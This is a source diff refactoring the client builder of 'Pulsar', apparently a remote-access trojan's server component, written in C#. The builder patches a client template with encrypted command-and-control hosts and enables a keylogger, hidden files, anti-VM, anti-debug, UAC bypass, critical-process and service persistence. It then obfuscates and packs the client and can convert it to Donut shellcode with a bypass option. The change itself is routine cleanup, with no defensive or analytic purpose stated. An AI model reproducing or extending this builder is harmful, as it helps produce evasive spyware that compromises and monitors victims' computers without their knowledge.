@@ -1,16 +1,14 @@
 ﻿using Mono.Cecil;
 using Mono.Cecil.Cil;
 using Pulsar.Common.Cryptography;
-using Pulsar.Server.Models;
 using Pulsar.Server.Helper;
+using Pulsar.Server.Models;
 using System;
+using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using Vestris.ResourceLib;
-using System.Diagnostics;
-using System.IO;
-using System.Windows;
 
 namespace Pulsar.Server.Build
 {
@@ -24,72 +22,263 @@ namespace Pulsar.Server.Build
 
         public ClientBuilder(BuildOptions options, string clientFilePath)
         {
-            _options = options;
-            _clientFilePath = clientFilePath;
+            _options = options ?? throw new ArgumentNullException(nameof(options));
+            _clientFilePath = clientFilePath ?? throw new ArgumentNullException(nameof(clientFilePath));
         }
 
         /// <summary>
-        /// Builds a client executable.
+        /// Builds a client executable. Validation errors throw; false preserves
+        /// the caller's existing success convention.
         /// </summary>
         public bool Build(bool obfuscateBuild, bool packBuild)
         {
-            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
+            Prepare(false);
+            byte[] buffer;
+            string certificateThumbprint;
+            string entryPoint;
+
+            using (var asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
             {
-                // PHASE 1 - Writing settings
-                WriteSettings(asmDef);
-
-                // PHASE 2 - Obfuscation
-
-                Renamer r = new Renamer(asmDef);
-
-                if (!r.Perform())
-                    throw new Exception("renaming failed");
-
-                MemoryStream stream = new MemoryStream();
-                asmDef.Write(stream);
-                stream.Position = 0;
-                asmDef.Dispose();
-
-                byte[] buffer = stream.ToArray();
-
-                if (obfuscateBuild)
-                {
-                    Obfuscator.Obfuscator obf = new Obfuscator.Obfuscator(buffer);
-                    obf.Obfuscate();
-                    buffer = obf.Save();
-                }
-                if (packBuild)
-                {
-                    TinyLoader.TinyLoader tinyLoader = new TinyLoader.TinyLoader(buffer);
-                    tinyLoader.Pack();
-                    buffer = tinyLoader.Save();
-                }
-
-
-                //check if _options.OutputPath is in the same directory as our server executable
-                string outputDirectory = Path.GetDirectoryName(Path.GetFullPath(_options.OutputPath));
-                string serverDirectory = Path.GetDirectoryName(Path.GetFullPath(System.Reflection.Assembly.GetExecutingAssembly().Location));
-                if (outputDirectory.Equals(serverDirectory, StringComparison.OrdinalIgnoreCase))
-                {
-                    MessageBox.Show("The output path cannot be in the same directory as the server executable. Please choose a different output path.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
-                    return true;
-                }
-
-                File.WriteAllBytes(_options.OutputPath, buffer);
-
+                certificateThumbprint = WriteSettings(asmDef);
+                RenameAssembly(asmDef);
+                buffer = WriteAssembly(asmDef);
             }
 
-            // PHASE 4 - Assembly Information changing
+            buffer = Transform(buffer, obfuscateBuild, packBuild);
+            entryPoint = GetEntryPointFromBytes(buffer);
+            File.WriteAllBytes(Path.GetFullPath(_options.OutputPath), buffer);
+            ApplyResources();
+            ClientBuildManifest.Write(
+                _options,
+                Path.GetFullPath(_clientFilePath),
+                certificateThumbprint,
+                "managed-executable",
+                entryPoint,
+                obfuscateBuild,
+                packBuild);
+
+            return false;
+        }
+
+        public void BuildShellcode(bool obfuscateBuild, bool packBuild)
+        {
+            Prepare(true);
+            var outputPath = Path.GetFullPath(_options.OutputPath);
+            var intermediatePath = outputPath + ".payload.exe";
+            string certificateThumbprint;
+            string entryPoint;
+            byte[] buffer;
+
+            try
+            {
+                using (var asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
+                {
+                    certificateThumbprint = WriteSettings(asmDef);
+                    RenameAssembly(asmDef);
+                    buffer = Transform(WriteAssembly(asmDef), obfuscateBuild, packBuild);
+                    File.WriteAllBytes(intermediatePath, buffer);
+                }
+
+                entryPoint = GetEntryPointFromBytes(File.ReadAllBytes(intermediatePath));
+                var donutPath = ResolveOptionalPath(
+                    _options.DonutPath,
+                    Path.Combine(GetServerDirectory(), "donut.exe"),
+                    "Donut");
+
+                ShellcodeBuilder.GenerateShellcode(
+                    intermediatePath,
+                    entryPoint.Substring(0, entryPoint.LastIndexOf('.')),
+                    entryPoint.Substring(entryPoint.LastIndexOf('.') + 1),
+                    outputPath,
+                    false,
+                    donutPath,
+                    string.Empty,
+                    EntropyLevel.RandomSymmetric,
+                    Architecture.Both,
+                    Format.Binary,
+                    Headers.Overwrite,
+                    _options.ShellcodeCompression,
+                    _options.ShellcodeBypass);
+
+                ClientBuildManifest.Write(
+                    _options,
+                    Path.GetFullPath(_clientFilePath),
+                    certificateThumbprint,
+                    "donut-shellcode",
+                    entryPoint,
+                    obfuscateBuild,
+                    packBuild);
+            }
+            finally
+            {
+                if (File.Exists(intermediatePath))
+                    File.Delete(intermediatePath);
+            }
+        }
+
+        private void Prepare(bool shellcode)
+        {
+            BuildOptionsValidator.Validate(_options, shellcode);
+
+            if (!File.Exists(_clientFilePath))
+                throw new FileNotFoundException("Client template not found.", Path.GetFullPath(_clientFilePath));
+
+            var outputPath = Path.GetFullPath(_options.OutputPath);
+            var outputDirectory = Path.GetDirectoryName(outputPath);
+            var serverDirectory = GetServerDirectory();
+
+            if (string.Equals(outputDirectory, serverDirectory, StringComparison.OrdinalIgnoreCase))
+                throw new InvalidOperationException(
+                    "The output path cannot be in the same directory as the server executable.");
+
+            if (string.Equals(outputPath, Path.GetFullPath(_clientFilePath), StringComparison.OrdinalIgnoreCase))
+                throw new InvalidOperationException("The output path cannot replace the client template.");
+
+            Directory.CreateDirectory(outputDirectory);
+        }
+
+        private string WriteSettings(AssemblyDefinition asmDef)
+        {
+            var certificatePath = ResolveOptionalPath(
+                _options.CertificatePath,
+                Settings.CertificatePath,
+                "Certificate");
+
+            using (var caCertificate = new X509Certificate2(
+                       certificatePath,
+                       string.Empty,
+                       X509KeyStorageFlags.Exportable))
+            using (var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)))
+            {
+                var key = serverCertificate.Thumbprint;
+                var aes = new Aes256(key);
+                byte[] signature;
+
+                using (var csp = caCertificate.GetRSAPrivateKey())
+                {
+                    if (csp == null)
+                        throw new CryptographicException("The configured certificate does not contain a private key.");
+
+                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
+                    signature = csp.SignHash(hash, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
+                }
+
+                var slots = ClientSettingsLayout.GetInstructions(asmDef);
+                var strings = new[]
+                {
+                    aes.Encrypt(_options.Version),
+                    aes.Encrypt(_options.RawHosts),
+                    aes.Encrypt(_options.InstallSub),
+                    aes.Encrypt(_options.InstallName),
+                    aes.Encrypt(_options.Mutex),
+                    aes.Encrypt(_options.StartupName),
+                    key,
+                    aes.Encrypt(_options.Tag),
+                    aes.Encrypt(_options.LogDirectoryName),
+                    aes.Encrypt(Convert.ToBase64String(signature)),
+                    aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)))
+                };
+
+                for (var i = 0; i < strings.Length; i++)
+                    slots.Strings[i].Operand = strings[i];
+
+                var booleans = new[]
+                {
+                    _options.Install,
+                    _options.Startup,
+                    _options.HideFile,
+                    _options.Keylogger,
+                    _options.HideLogDirectory,
+                    _options.HideInstallSubdirectory,
+                    _options.AntiVM,
+                    _options.AntiDebug,
+                    _options.Pastebin,
+                    _options.UACBypass,
+                    _options.CRITICALPROCESS,
+                    _options.INSTALLSERVICE,
+                    _options.SHOWCLIENTGUI
+                };
+
+                for (var i = 0; i < booleans.Length; i++)
+                {
+                    slots.Booleans[i].OpCode = BoolOpCode(booleans[i]);
+                    slots.Booleans[i].Operand = null;
+                }
+
+                slots.Delay.Operand = _options.Delay;
+                slots.SpecialFolder.Operand = GetSpecialFolder(_options.InstallPath);
+                return serverCertificate.Thumbprint;
+            }
+        }
+
+        private static void RenameAssembly(AssemblyDefinition asmDef)
+        {
+            var renamer = new Renamer(asmDef);
+            if (!renamer.Perform())
+                throw new InvalidOperationException("Renaming failed.");
+        }
+
+        private static MethodDefinition GetEntryPoint(AssemblyDefinition asmDef)
+        {
+            var entryPoint = asmDef.EntryPoint;
+            if (entryPoint == null || entryPoint.DeclaringType == null)
+                throw new InvalidOperationException("Client template has no managed entry point.");
+
+            return entryPoint;
+        }
+
+        private static string FormatEntryPoint(MethodDefinition entryPoint) =>
+            entryPoint.DeclaringType.FullName + "." + entryPoint.Name;
+
+        private static string GetEntryPointFromBytes(byte[] assemblyBytes)
+        {
+            using (var stream = new MemoryStream(assemblyBytes))
+            using (var asmDef = AssemblyDefinition.ReadAssembly(stream))
+            {
+                return FormatEntryPoint(GetEntryPoint(asmDef));
+            }
+        }
+
+        private static byte[] WriteAssembly(AssemblyDefinition asmDef)
+        {
+            using (var stream = new MemoryStream())
+            {
+                asmDef.Write(stream);
+                return stream.ToArray();
+            }
+        }
+
+        private static byte[] Transform(byte[] buffer, bool obfuscateBuild, bool packBuild)
+        {
+            if (obfuscateBuild)
+            {
+                var obfuscator = new Obfuscator.Obfuscator(buffer);
+                obfuscator.Obfuscate();
+                buffer = obfuscator.Save();
+            }
+
+            if (packBuild)
+            {
+                var tinyLoader = new TinyLoader.TinyLoader(buffer);
+                tinyLoader.Pack();
+                buffer = tinyLoader.Save();
+            }
+
+            return buffer;
+        }
+
+        private void ApplyResources()
+        {
             if (_options.AssemblyInformation != null)
             {
-                VersionResource versionResource = new VersionResource();
+                var versionResource = new VersionResource();
                 versionResource.LoadFrom(_options.OutputPath);
 
                 versionResource.FileVersion = _options.AssemblyInformation[7];
                 versionResource.ProductVersion = _options.AssemblyInformation[6];
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
+                var stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                 stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                 stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                 stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
@@ -104,214 +293,28 @@ namespace Pulsar.Server.Build
                 versionResource.SaveTo(_options.OutputPath);
             }
 
-            // PHASE 5 - Icon changing
             if (!string.IsNullOrEmpty(_options.IconPath))
             {
-                IconFile iconFile = new IconFile(_options.IconPath);
-                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
+                var iconFile = new IconFile(_options.IconPath);
+                var iconDirectoryResource = new IconDirectoryResource(iconFile);
                 iconDirectoryResource.SaveTo(_options.OutputPath);
             }
-
-            return false;
         }
 
-        public void BuildShellcode(bool obfuscateBuild, bool packBuild)
+        private static string GetServerDirectory() =>
+            Path.GetDirectoryName(Path.GetFullPath(System.Reflection.Assembly.GetExecutingAssembly().Location));
+
+        private static string ResolveOptionalPath(string requestedPath, string fallbackPath, string name)
         {
-            if (!File.Exists(Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "donut.exe")))
-                throw new Exception("Donut not found! Shellcode conversion not possible. Try building with donut");
-            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
-            {
-                // PHASE 1 - Writing Settings (WARNING: WE NEED TO REMOVE STARTUP AND OTHER DROPPER SETTINGS)
-                WriteSettings(asmDef);
-
-                // PHASE 2 - Obfuscation
-
-                Renamer r = new Renamer(asmDef);
-
-                if (!r.Perform())
-                    throw new Exception("renaming failed");
-
-                MemoryStream stream = new MemoryStream();
-                asmDef.Write(stream);
-                stream.Position = 0;
-                asmDef.Dispose();
-
-                byte[] buffer = stream.ToArray();
-
-                if (obfuscateBuild)
-                {
-                    Obfuscator.Obfuscator obf = new Obfuscator.Obfuscator(buffer);
-                    obf.Obfuscate();
-                    buffer = obf.Save();
-                }
-                if (packBuild)
-                {
-                    TinyLoader.TinyLoader tinyLoader = new TinyLoader.TinyLoader(buffer);
-                    tinyLoader.Pack();
-                    buffer = tinyLoader.Save();
-                }
-                File.WriteAllBytes(_options.OutputPath + ".exe", buffer);
-            }
-            // PHASE 3 - Shellcode
-            ShellcodeBuilder.GenerateShellcode(
-                _options.OutputPath + ".exe",
-                "Pulsar.Client.Program",
-                "Main",
-                _options.OutputPath,
-                false
-            );
-            File.Delete(_options.OutputPath + ".exe");
-        }
-      
-        private void WriteSettings(AssemblyDefinition asmDef)
-        {
-            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
-            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // export without private key, very important!
-
-            var key = serverCertificate.Thumbprint;
-            var aes = new Aes256(key);
-
-            byte[] signature;
-            // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
-            using (var csp = caCertificate.GetRSAPrivateKey())
-            {
-                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
-                signature = csp.SignHash(hash, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
-            }
-
-            foreach (var typeDef in asmDef.Modules[0].Types)
-            {
-                if (typeDef.FullName == "Pulsar.Client.Config.Settings")
-                {
-                    foreach (var methodDef in typeDef.Methods)
-                    {
-                        if (methodDef.Name == ".cctor")
-                        {
-                            int strings = 1, bools = 1;
-
-                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
-                            {
-                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
-                                {
-                                    switch (strings)
-                                    {
-                                        case 1: //version
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Version);
-                                            break;
-                                        case 2: //ip/hostname
-                                            Debug.WriteLine(_options.RawHosts);
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);
-                                            break;
-                                        case 3: //installsub
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallSub);
-                                            break;
-                                        case 4: //installname
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallName);
-                                            break;
-                                        case 5: //mutex
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Mutex);
-                                            break;
-                                        case 6: //startupkey
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.StartupName);
-                                            break;
-                                        case 7: //encryption key
-                                            methodDef.Body.Instructions[i].Operand = key;
-                                            break;
-                                        case 8: //tag
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Tag);
-                                            break;
-                                        case 9: //LogDirectoryName
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.LogDirectoryName);
-                                            break;
-                                        case 10: //ServerSignature
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
-                                            break;
-                                        case 11: //ServerCertificate
-                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
-                                            break;
-                                    }
-                                    strings++;
-                                }
-                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_1 ||
-                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_0) // bool
-                                {
-                                    switch (bools)
-                                    {
-                                        case 1: //install
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Install));
-                                            break;
-                                        case 2: //startup
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Startup));
-                                            break;
-                                        case 3: //hidefile
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideFile));
-                                            break;
-                                        case 4: //Keylogger
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Keylogger));
-                                            break;
-                                        case 5: //HideLogDirectory
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideLogDirectory));
-                                            break;
-                                        case 6: // HideInstallSubdirectory
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
-                                            break;
-                                        case 7: // AntiVM
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.AntiVM));
-                                            break;
-                                        case 8: // AntiDebug
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.AntiDebug));
-                                            break;
-                                        case 9: // Pastebin
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Pastebin));
-                                            break;
-                                        case 10: // UACBypass
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UACBypass));
-                                            break;
-                                        case 11: // CRITICALPROCESS
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.CRITICALPROCESS));
-                                            break;
-                                        case 12: // InstallService
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.INSTALLSERVICE));
-                                            break;
-                                        case 13: // ShowClientGui
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.SHOWCLIENTGUI));
-                                            break;
-                                    }
-                                    bools++;
-                                }
-                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4) // int
-                                {
-                                    //reconnectdelay
-                                    methodDef.Body.Instructions[i].Operand = _options.Delay;
-                                }
-                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_S) // sbyte
-                                {
-                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(_options.InstallPath);
-                                }
-                            }
-                        }
-                    }
-                }
-            }
+            var path = string.IsNullOrWhiteSpace(requestedPath) ? fallbackPath : requestedPath;
+            if (string.IsNullOrWhiteSpace(path) || !File.Exists(path))
+                throw new FileNotFoundException($"{name} file not found.", path);
+            return Path.GetFullPath(path);
         }
 
-        /// <summary>
-        /// Obtains the OpCode that corresponds to the bool value provided.
-        /// </summary>
-        /// <param name="p">The value to convert to the OpCode</param>
-        /// <returns>Returns the OpCode that represents the value provided.</returns>
-        private OpCode BoolOpCode(bool p)
-        {
-            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
-        }
+        private static OpCode BoolOpCode(bool value) => value ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
 
-        /// <summary>
-        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
-        /// </summary>
-        /// <param name="installPath">The integer value of the install path.</param>
-        /// <returns>Returns the signed-byte value of the special folder.</returns>
-        /// <exception cref="ArgumentException">Thrown if the path to the special folder was invalid.</exception>
-        private sbyte GetSpecialFolder(int installPath)
+        private static sbyte GetSpecialFolder(int installPath)
         {
             switch (installPath)
             {
@@ -322,7 +325,7 @@ namespace Pulsar.Server.Build
                 case 3:
                     return (sbyte)Environment.SpecialFolder.System;
                 default:
-                    throw new ArgumentException("InstallPath");
+                    throw new ArgumentOutOfRangeException(nameof(installPath));
             }
         }
     }
